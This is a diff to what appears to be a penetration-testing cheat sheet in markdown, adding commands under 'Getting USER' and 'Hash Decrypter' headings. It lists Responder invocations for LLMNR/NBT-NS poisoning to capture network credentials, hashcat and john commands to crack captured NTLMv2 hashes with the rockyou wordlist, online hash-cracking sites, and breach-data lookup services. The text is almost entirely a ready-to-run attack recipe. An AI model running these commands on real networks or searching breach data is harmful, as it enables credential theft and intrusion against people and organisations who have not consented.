@@ -62,7 +62,26 @@ set ABORT_ON_LOCKOUT true
 ```
 # <h2> Tool 2. Getting USERLLMNR/NBT-NS Poising with the help of Responder. </h2>
 ```
-sudo responder -I ens33 -wdrf
+responder -I ens33 -wdrf
+responder -I ens33 -wd
+responder -I ens33 -A
+responder -I ens33 -wdF -b
+responder -I ens33 -wdF --lm --disable-ess
+responder -I ens33 -e 192.168.1.2
+# <h2> Hash Decrypter </h2>
+ ```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+john SMB-NTLMv2-SSP-192.168.100.101.txt –wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt
+https://crackstation.net/
+https://hashes.com/en/decrypt/hash
+```
+# <h2> Leak Data Checker </h2>
+```
+https://leakcheck.io/
+https://breachdirectory.org/
+https://www.dehashed.com/
+```
 ```
 # <h2> Tool 3. ENUM4LINUX. </h2>
 ```
